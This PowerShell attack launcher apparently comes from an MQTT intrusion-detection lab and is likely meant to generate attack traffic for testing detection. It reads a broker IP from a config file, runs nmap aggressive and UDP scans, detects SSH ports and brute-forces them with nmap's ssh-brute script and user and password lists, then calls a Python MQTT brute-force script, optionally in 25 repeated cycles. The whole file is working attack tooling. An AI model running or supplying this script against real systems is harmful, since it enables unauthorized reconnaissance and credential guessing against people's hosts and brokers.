# ============================================================
# MQTT IDS LAB - FULL ATTACK SCRIPT (Improved SSH Detection)
# ============================================================

$ProjectRoot = Split-Path $PSScriptRoot -Parent
$ConfigPath  = Join-Path $ProjectRoot "configs/network_config.json"
$NetConfig   = Get-Content $ConfigPath | ConvertFrom-Json

$TARGET = $NetConfig.broker_ip

$USERS      = Join-Path $PSScriptRoot "users.txt"
$PASSWORDS  = Join-Path $PSScriptRoot "passwords.txt"
$MQTT_BRUTE = Join-Path $PSScriptRoot "mqtt_bruteforce.py"

# Common SSH ports to test
$CommonSSHPorts = "22,2222,2200,2022,8022,222,9922,10022"

Write-Host "============================================================" -ForegroundColor Yellow
Write-Host "                MQTT IDS LAB - ATTACK LAUNCHER              " -ForegroundColor Cyan
Write-Host "============================================================"
Write-Host ""
Write-Host "Target Broker IP: $TARGET" -ForegroundColor Cyan

Write-Host " [1] Run all attacks once"
Write-Host " [2] Run attacks in a loop (25 cycles)"
Write-Host " [3] Exit"
Write-Host ""

$choice = Read-Host "Enter your choice"

# ------------------------------------------
# FUNCTION: Detect SSH port before brute-force
# ------------------------------------------
function Find-SSHPorts {
    Write-Host "`n[SCAN] Detecting SSH service on common ports..." -ForegroundColor Yellow
    $ScanOutput = nmap -sV -p $CommonSSHPorts $TARGET

    $FoundSSH = ($ScanOutput | Select-String -Pattern "ssh" -SimpleMatch) |
        ForEach-Object {
            ($_ -split "/")[0].Trim()
        }

    return $FoundSSH
}

# ------------------------------------------
# FUNCTION: Run ssh-brute on detected ports
# ------------------------------------------
function Run-SSHBrute {
    $SSHPorts = Find-SSHPorts

    if ($SSHPorts.Count -eq 0) {
        Write-Host "`n[INFO] No SSH service found. Skipping SSH brute-force." -ForegroundColor DarkYellow
        return
    }

    Write-Host "`n[INFO] SSH Detected on: $($SSHPorts -join ', ')" -ForegroundColor Green

    foreach ($Port in $SSHPorts) {
        Write-Host "`n[SSH Bruteforce] Running ssh-brute on port $Port..." -ForegroundColor Yellow

        nmap -p $Port --script ssh-brute `
            --script-args "userdb=$USERS,passdb=$PASSWORDS" $TARGET
    }
}

switch ($choice) {

# -------------------------------------------------------------
# OPTION 1: RUN ALL ATTACKS ONCE
# -------------------------------------------------------------
"1" {
    Write-Host "`nRunning ALL attacks once..." -ForegroundColor Green
    Write-Host "============================================================"

    Write-Host "`n[1] Aggressive Scan (-A)..." -ForegroundColor Yellow
    nmap -A $TARGET
    Start-Sleep -Seconds 3

    Write-Host "`n[2] UDP Scan (-sU)..." -ForegroundColor Yellow
    nmap -sU $TARGET
    Start-Sleep -Seconds 3

    Write-Host "`n[3] SSH Bruteforce..." -ForegroundColor Yellow
    Run-SSHBrute
    Start-Sleep -Seconds 3

    Write-Host "`n[4] MQTT Bruteforce..." -ForegroundColor Yellow
    python $MQTT_BRUTE $TARGET

    Write-Host "`nALL ATTACKS COMPLETED." -ForegroundColor Green
    Pause
}

# -------------------------------------------------------------
# OPTION 2: CONTINUOUS LOOP
# -------------------------------------------------------------
"2" {
    $LOOP_COUNT = 25
    Write-Host "`nRunning $LOOP_COUNT attack cycles..." -ForegroundColor Cyan

    for ($i = 1; $i -le $LOOP_COUNT; $i++) {

        Write-Host "`n------------------------------------------------------------" -ForegroundColor Blue
        Write-Host "[CYCLE $i/$LOOP_COUNT] Full attack sequence..." -ForegroundColor Cyan
        Write-Host "Timestamp: $(Get-Date)" -ForegroundColor DarkGray

        Write-Host "`n[1] Aggressive Scan (-A)..." -ForegroundColor Yellow
        nmap -A $TARGET
        Start-Sleep -Seconds 3

        Write-Host "`n[2] UDP Scan (-sU)..." -ForegroundColor Yellow
        nmap -sU $TARGET
        Start-Sleep -Seconds 3

        Write-Host "`n[3] SSH Bruteforce..." -ForegroundColor Yellow
        Run-SSHBrute
        Start-Sleep -Seconds 3

        Write-Host "`n[4] MQTT Bruteforce..." -ForegroundColor Yellow
        python $MQTT_BRUTE $TARGET

        Write-Host "`n===== Cycle $i completed =====" -ForegroundColor Green
        Start-Sleep -Seconds 5
    }

    Write-Host "`nAll $LOOP_COUNT cycles completed!" -ForegroundColor Green
    Pause
}

# -------------------------------------------------------------
# EXIT OPTION
# -------------------------------------------------------------
"3" {
    Write-Host "Exiting..." -ForegroundColor Yellow
}

default {
    Write-Host "`nInvalid choice." -ForegroundColor Red
}
}

Write-Host "`n============================================================"
Write-Host " ATTACK SCRIPT FINISHED"
Write-Host "============================================================"

Pause
